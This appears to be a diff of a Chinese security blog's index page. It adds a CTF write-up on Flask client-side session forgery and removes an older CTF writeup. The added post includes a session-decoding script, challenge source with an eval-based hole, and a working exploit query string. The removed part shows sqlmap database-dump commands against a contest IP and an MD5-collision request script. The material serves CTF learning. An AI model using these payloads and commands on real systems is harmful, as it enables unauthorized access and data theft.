@@ -155,6 +155,88 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-flask session" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/05/11/flask session/">Python Web之flask session漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2019/05/11/flask session/" class="archive-article-date">
+  	<time datetime="2019-05-11T05:40:36.601Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>上个月打了个DDCTF，遇到了python flask的题，还没好好做个总结理解，这里记录一下。</p>
+<h3 id="0x02-Python-flask-session"><a href="#0x02-Python-flask-session" class="headerlink" title="0x02 Python flask session"></a>0x02 Python flask session</h3><p>flask是轻量级的web框架，所以它的session存储在客户端里，通过http消息头在cookie就可以看到，且对session只签名，缺少数据防篡改实现，容易存在安全漏洞。</p>
+<p>关于flask session原理代码可以看这篇文章</p>
+<p><a href="https://cizixs.com/2017/03/08/flask-insight-session/" target="_blank" rel="noopener">flask session机制原理</a></p>
+<p>关于flask 客户端session安全可以看看p牛这篇文章</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">flask 客户端session机制安全</a></p>
+<p>p牛的解密脚本为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b&apos;.&apos;, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b&apos;.&apos;, 1)</span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b&apos;.&apos;):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&apos;Could not base64 decode the payload because of &apos;</span><br><span class="line">                         &apos;an exception&apos;)</span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&apos;Could not zlib decompress the payload before &apos;</span><br><span class="line">                             &apos;decoding the payload&apos;)</span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    print(decryption(sys.argv[1].encode()))</span><br></pre></td></tr></table></figure></p>
+<p>通过脚本解密session，可以了解session中存储着哪些信息。然后通过其他漏洞获取用于签名认证的secret_key,进一步伪造任意用户身份，扩大攻击效果。</p>
+<h3 id="0x03-实战"><a href="#0x03-实战" class="headerlink" title="0x03 实战"></a>0x03 实战</h3><p>ddctf flask题源码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line"># written in python 2.7</span><br><span class="line">__author__ = &apos;garzon&apos;</span><br><span class="line"></span><br><span class="line">from flask import Flask, session, request, Response</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = &apos;*********************&apos; # censored</span><br><span class="line">url_prefix = &apos;/d5af33f66147e857&apos;</span><br><span class="line"></span><br><span class="line">def FLAG():</span><br><span class="line">	return &apos;FLAG_is_here_but_i_wont_show_you&apos;  # censored</span><br><span class="line">	</span><br><span class="line">def trigger_event(event):</span><br><span class="line">	session[&apos;log&apos;].append(event)</span><br><span class="line">	if len(session[&apos;log&apos;]) &gt; 5: session[&apos;log&apos;] = session[&apos;log&apos;][-5:]</span><br><span class="line">	if type(event) == type([]):</span><br><span class="line">		request.event_queue += event</span><br><span class="line">	else:</span><br><span class="line">		request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line">def get_mid_str(haystack, prefix, postfix=None):</span><br><span class="line">	haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">	if postfix is not None:</span><br><span class="line">		haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">	return haystack</span><br><span class="line">	</span><br><span class="line">class RollBackException: pass</span><br><span class="line"></span><br><span class="line">def execute_event_loop():</span><br><span class="line">	valid_event_chars = set(&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&apos;)</span><br><span class="line">	resp = None</span><br><span class="line">	while len(request.event_queue) &gt; 0:</span><br><span class="line">		event = request.event_queue[0] # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span><br><span class="line">		request.event_queue = request.event_queue[1:]</span><br><span class="line">		if not event.startswith((&apos;action:&apos;, &apos;func:&apos;)): continue</span><br><span class="line">		for c in event:</span><br><span class="line">			if c not in valid_event_chars: break</span><br><span class="line">		else:</span><br><span class="line">			is_action = event[0] == &apos;a&apos;</span><br><span class="line">			action = get_mid_str(event, &apos;:&apos;, &apos;;&apos;)</span><br><span class="line">			args = get_mid_str(event, action+&apos;;&apos;).split(&apos;#&apos;)</span><br><span class="line">			try:</span><br><span class="line">				event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;))</span><br><span class="line">				ret_val = event_handler(args)</span><br><span class="line">			except RollBackException:</span><br><span class="line">				if resp is None: resp = &apos;&apos;</span><br><span class="line">				resp += &apos;ERROR! All transactions have been cancelled. &lt;br /&gt;&apos;</span><br><span class="line">				resp += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">				session[&apos;num_items&apos;] = request.prev_session[&apos;num_items&apos;]</span><br><span class="line">				session[&apos;points&apos;] = request.prev_session[&apos;points&apos;]</span><br><span class="line">				break</span><br><span class="line">			except Exception, e:</span><br><span class="line">				if resp is None: resp = &apos;&apos;</span><br><span class="line">				#resp += str(e) # only for debugging</span><br><span class="line">				continue</span><br><span class="line">			if ret_val is not None:</span><br><span class="line">				if resp is None: resp = ret_val</span><br><span class="line">				else: resp += ret_val</span><br><span class="line">	if resp is None or resp == &apos;&apos;: resp = (&apos;404 NOT FOUND&apos;, 404)</span><br><span class="line">	session.modified = True</span><br><span class="line">	return resp</span><br><span class="line">	</span><br><span class="line">@app.route(url_prefix+&apos;/&apos;)</span><br><span class="line">def entry_point():</span><br><span class="line">	querystring = urllib.unquote(request.query_string)</span><br><span class="line">	request.event_queue = []</span><br><span class="line">	if querystring == &apos;&apos; or (not querystring.startswith(&apos;action:&apos;)) or len(querystring) &gt; 100:</span><br><span class="line">		querystring = &apos;action:index;False#False&apos;</span><br><span class="line">	if &apos;num_items&apos; not in session:</span><br><span class="line">		session[&apos;num_items&apos;] = 0</span><br><span class="line">		session[&apos;points&apos;] = 3</span><br><span class="line">		session[&apos;log&apos;] = []</span><br><span class="line">	request.prev_session = dict(session)</span><br><span class="line">	trigger_event(querystring)</span><br><span class="line">	return execute_event_loop()</span><br><span class="line"></span><br><span class="line"># handlers/functions below --------------------------------------</span><br><span class="line"></span><br><span class="line">def view_handler(args):</span><br><span class="line">	page = args[0]</span><br><span class="line">	html = &apos;&apos;</span><br><span class="line">	html += &apos;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&apos;.format(session[&apos;num_items&apos;], session[&apos;points&apos;])</span><br><span class="line">	if page == &apos;index&apos;:</span><br><span class="line">		html += &apos;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">		html += &apos;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">		html += &apos;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">	elif page == &apos;shop&apos;:</span><br><span class="line">		html += &apos;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">	elif page == &apos;reset&apos;:</span><br><span class="line">		del session[&apos;num_items&apos;]</span><br><span class="line">		html += &apos;Session reset.&lt;br /&gt;&apos;</span><br><span class="line">	html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">	return html</span><br><span class="line"></span><br><span class="line">def index_handler(args):</span><br><span class="line">	bool_show_source = str(args[0])</span><br><span class="line">	bool_download_source = str(args[1])</span><br><span class="line">	if bool_show_source == &apos;True&apos;:</span><br><span class="line">	</span><br><span class="line">		source = open(&apos;eventLoop.py&apos;, &apos;r&apos;)</span><br><span class="line">		html = &apos;&apos;</span><br><span class="line">		if bool_download_source != &apos;True&apos;:</span><br><span class="line">			html += &apos;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">			html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">			</span><br><span class="line">		for line in source:</span><br><span class="line">			if bool_download_source != &apos;True&apos;:</span><br><span class="line">				html += line.replace(&apos;&amp;&apos;,&apos;&amp;amp;&apos;).replace(&apos;\t&apos;, &apos;&amp;nbsp;&apos;*4).replace(&apos; &apos;,&apos;&amp;nbsp;&apos;).replace(&apos;&lt;&apos;, &apos;&amp;lt;&apos;).replace(&apos;&gt;&apos;,&apos;&amp;gt;&apos;).replace(&apos;\n&apos;, &apos;&lt;br /&gt;&apos;)</span><br><span class="line">			else:</span><br><span class="line">				html += line</span><br><span class="line">		source.close()</span><br><span class="line">		</span><br><span class="line">		if bool_download_source == &apos;True&apos;:</span><br><span class="line">			headers = &#123;&#125;</span><br><span class="line">			headers[&apos;Content-Type&apos;] = &apos;text/plain&apos;</span><br><span class="line">			headers[&apos;Content-Disposition&apos;] = &apos;attachment; filename=serve.py&apos;</span><br><span class="line">			return Response(html, headers=headers)</span><br><span class="line">		else:</span><br><span class="line">			return html</span><br><span class="line">	else:</span><br><span class="line">		trigger_event(&apos;action:view;index&apos;)</span><br><span class="line">		</span><br><span class="line">def buy_handler(args):</span><br><span class="line">	num_items = int(args[0])</span><br><span class="line">	if num_items &lt;= 0: return &apos;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&apos;.format(args[0])</span><br><span class="line">	session[&apos;num_items&apos;] += num_items </span><br><span class="line">	trigger_event([&apos;func:consume_point;&#123;&#125;&apos;.format(num_items), &apos;action:view;index&apos;])</span><br><span class="line">	</span><br><span class="line">def consume_point_function(args):</span><br><span class="line">	point_to_consume = int(args[0])</span><br><span class="line">	if session[&apos;points&apos;] &lt; point_to_consume: raise RollBackException()</span><br><span class="line">	session[&apos;points&apos;] -= point_to_consume</span><br><span class="line">	</span><br><span class="line">def show_flag_function(args):</span><br><span class="line">	flag = args[0]</span><br><span class="line">	#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span><br><span class="line">	return &apos;You naughty boy! ;) &lt;br /&gt;&apos;</span><br><span class="line">	</span><br><span class="line">def get_flag_handler(args):</span><br><span class="line">	if session[&apos;num_items&apos;] &gt;= 5:</span><br><span class="line">		trigger_event(&apos;func:show_flag;&apos; + FLAG()) # show_flag_function has been disabled, no worries</span><br><span class="line">	trigger_event(&apos;action:view;index&apos;)</span><br><span class="line">	</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	app.run(debug=False, host=&apos;0.0.0.0&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>这个我看的挺久了，不是很完全明白，payload是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action:trigger_event%23;action:buy;5%23action:get_flag;</span><br></pre></td></tr></table></figure></p>
+<p>它大致思路是，首先从路由@app.route(url_prefix+’/‘)开始，也就是开始分析该下面的entry_point()函数，它要求获取?后面的字符串，然后调用trigger_event()函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def trigger_event(event):   </span><br><span class="line">    session[&apos;log&apos;].append(event)</span><br><span class="line">    if len(session[&apos;log&apos;]) &gt; 5: session[&apos;log&apos;] = session[&apos;log&apos;][-5:]  # 如果session[&apos;log&apos;]列表的后五个成员。</span><br><span class="line">    if type(event) == type([]):   </span><br><span class="line">        request.event_queue += event</span><br><span class="line">    else:</span><br><span class="line">        request.event_queue.append(event)</span><br></pre></td></tr></table></figure>
+<p>之后就是执行execute_event_loop()函数了，大致是要求传入有action或func的字符串，漏洞发生点在eval</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;)) </span><br><span class="line">ret_val = event_handler(args)</span><br></pre></td></tr></table></figure>
+<p>大致意思是这个函数会循环提取队列中的字符串，最终由get_mid_str函数提取出函数名和参数，然后把函数名用eval与_handler或者_function拼接，接着执行该函数</p>
+<p>这个execute_event_loop()里面有个while，是能在满足条件的情况下，多次循环的原因吧，这里的action按照payload来说是trigger_event#,args是[‘action:buy;10’, ‘action:get_flag;’, ‘a:show_flag;1’]</p>
+<p>trigger_event是支持传入列表的，那么我们可以调用名为trigger_event的函数，参数为先buy后get_flag即可。</p>
+<p>然后就是得到的cookie解密一下即可。</p>
+<p>相关文章参考：<a href="https://www.360zhijia.com/anquan/460259.html" target="_blank" rel="noopener">https://www.360zhijia.com/anquan/460259.html</a></p>
+<p><a href="https://www.jianshu.com/p/cf4582c5afa5" target="_blank" rel="noopener">https://www.jianshu.com/p/cf4582c5afa5</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/05/11/flask session/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-phpbottom" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -962,110 +1044,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2019/04/06/掘安杯/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-风筝writewp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/30/风筝writewp/">2019上海嘉韦思杯线上赛writeup</a>
-    </h1>
-  
-
-        
-        <a href="/2019/03/30/风筝writewp/" class="archive-article-date">
-  	<time datetime="2019-03-30T08:18:54.905Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="2019上海嘉韦思杯线上赛writeup"><a href="#2019上海嘉韦思杯线上赛writeup" class="headerlink" title="2019上海嘉韦思杯线上赛writeup"></a>2019上海嘉韦思杯线上赛writeup</h2><p>估计是第一届的原因，比赛比较水，随便做做写了wp交上去</p>
-<h3 id="土肥原贤二"><a href="#土肥原贤二" class="headerlink" title="土肥原贤二"></a>土肥原贤二</h3><p>用sqlmap工具直接跑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://47.103.43.235:81/quest/web/a/index.php?gid=1&quot; -p &quot;gid&quot; --dbs</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://47.103.43.235:81/quest/web/a/index.php?gid=1&quot; -p &quot;gid&quot; -D &quot;luozhen&quot; --tables</span><br></pre></td></tr></table></figure>
-<p>之后是表，内容最后</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://47.103.43.235:81/quest/web/a/index.php?gid=1&quot; -p &quot;gid&quot; -D &quot;luozhen&quot; -T &quot;flag&quot; -C &quot;flag&quot; --dump</span><br></pre></td></tr></table></figure>
-<p>flag{20_welcome_19}</p>
-<h3 id="死亡真相"><a href="#死亡真相" class="headerlink" title="死亡真相"></a>死亡真相</h3><p>下载后是个wav文件，猜想是音频隐写，放入Audacity，</p>
-<p>查看频普图得到flag：85a9d4517d4725_b9_8cbc9fd_554216<br>但答案不对，思考很久看了文件属性发现多次有0</p>
-<p>便将_替换为0 ：85a9d4517d47250b908cbc9fd0554216</p>
-<p>再由md5解密可得flag{hsd132456}</p>
-<h3 id="吴佩孚"><a href="#吴佩孚" class="headerlink" title="吴佩孚"></a>吴佩孚</h3><p>base64解码后控制台跑一下</p>
-<h3 id="日军空袭"><a href="#日军空袭" class="headerlink" title="日军空袭"></a>日军空袭</h3><p>不断地base64解码后，再栅栏解密</p>
-<h3 id="戴星炳"><a href="#戴星炳" class="headerlink" title="戴星炳"></a>戴星炳</h3><p>写个脚本跑一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url =&apos;http://47.103.43.235:82/web/a/index.php&apos;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">text = r.get(url).text</span><br><span class="line">cal = str(re.findall(&quot;&lt;/p&gt;&lt;p&gt;(.*?)&lt;/p&gt;&quot;,text))[3:-2]</span><br><span class="line"># print cal</span><br><span class="line">ans = eval(cal)</span><br><span class="line"># print ans</span><br><span class="line">data= &#123;&quot;result&quot;: ans&#125;</span><br><span class="line">r1 = r.post(url,data=data)</span><br><span class="line">print r1.content</span><br></pre></td></tr></table></figure></p>
-<p>flag{Y0U_4R3_3o_F4ST!}</p>
-<h3 id="大美晚报"><a href="#大美晚报" class="headerlink" title="大美晚报"></a>大美晚报</h3><p>打开后是个二维码，扫描一下没发现flag</p>
-<p>保存到本地，binwalk了一下发现压缩包，里面有key.txt,提示是管理员QQ</p>
-<p>于是用暴力破解工具Ziperello从九位数起，得到密码674290437，输入后得flag{d6@YX$_m^aa0}</p>
-<h3 id="潘汉年"><a href="#潘汉年" class="headerlink" title="潘汉年"></a>潘汉年</h3><p>得到密文为 bg[<code>sZ*Zg&#39;dPfP</code>VM_SXVd</p>
-<p>想起有点像实验吧的变异凯撒密码，脚本为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = &quot;bg[`sZ*Zg&apos;dPfP`VM_SXVd&quot;</span><br><span class="line">res =&quot;&quot;</span><br><span class="line">j = 4</span><br><span class="line">for i in s:</span><br><span class="line">    res += chr(ord(i) + j)</span><br><span class="line">    j += 1</span><br><span class="line">print res</span><br></pre></td></tr></table></figure></p>
-<p>flag{c4es4r_variation}</p>
-<h3 id="袁殊"><a href="#袁殊" class="headerlink" title="袁殊"></a>袁殊</h3><p>是个rsa256，找了个脚本如下<br>1.py:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line"></span><br><span class="line">pub = RSA.importKey(open(&apos;gy.key&apos;).read())</span><br><span class="line">n = long(pub.n)</span><br><span class="line">e = long(pub.e)</span><br><span class="line">print n</span><br><span class="line">print e</span><br></pre></td></tr></table></figure></p>
-<p>2.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line">import sys</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(1024)</span><br><span class="line">keypair.p = 273821108020968288372911424519201044333          </span><br><span class="line">keypair.q = 280385007186315115828483000867559983517      </span><br><span class="line">keypair.e = 65537                                            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = long((keypair.p-1) * (keypair.q-1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = 1</span><br><span class="line">while (True):</span><br><span class="line">  x = (Qn * i ) + 1</span><br><span class="line">  if (x % keypair.e == 0):</span><br><span class="line">    keypair.d = x / keypair.e</span><br><span class="line">    break</span><br><span class="line">  i += 1</span><br><span class="line"></span><br><span class="line">private = open(&apos;private.pem&apos;,&apos;w&apos;)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure></p>
-<h3 id="76号"><a href="#76号" class="headerlink" title="76号"></a>76号</h3><p>打开后是个re2题<br>re2是一个输入，然后进入一个大switch语块，从1-z，刚开始没有啥头绪，然后那个v2变量引起了我的注意，我需要return 1最后。然后让v2每次加一。穷举即可得到flag</p>
-<h3 id="晴气庆胤"><a href="#晴气庆胤" class="headerlink" title="晴气庆胤"></a>晴气庆胤</h3><p>想起强网杯的md5碰撞</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import requests</span><br><span class="line">str1=&apos;d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70&apos;</span><br><span class="line">str1 = binascii.a2b_hex(str1)</span><br><span class="line">str2=&apos;d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70&apos;</span><br><span class="line">str2 = binascii.a2b_hex(str2)</span><br><span class="line">url = &apos;http://47.103.43.235:85/a/&apos;</span><br><span class="line">header = &#123;</span><br><span class="line">&apos;Cookie&apos;: &apos;PHPSESSID=v1j13robthdta88p9pl3urrhp4&apos;</span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">&apos;param1&apos;:str1,</span><br><span class="line">&apos;param2&apos;:str2</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,headers=header,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
-<p>flag{MD5@_@success}</p>
-<h3 id="梅津美治郎"><a href="#梅津美治郎" class="headerlink" title="梅津美治郎"></a>梅津美治郎</h3><p>打开后是个逆向题re1</p>
-<p>分成两个部分</p>
-<p>第一部分在ida中明文<br>第二部分是一个异或通过动态调试可以看到，逆还原得flag{r0b0RUlez!_w3lld0ne}</p>
-<p>下划线是看到群里提示才写的</p>
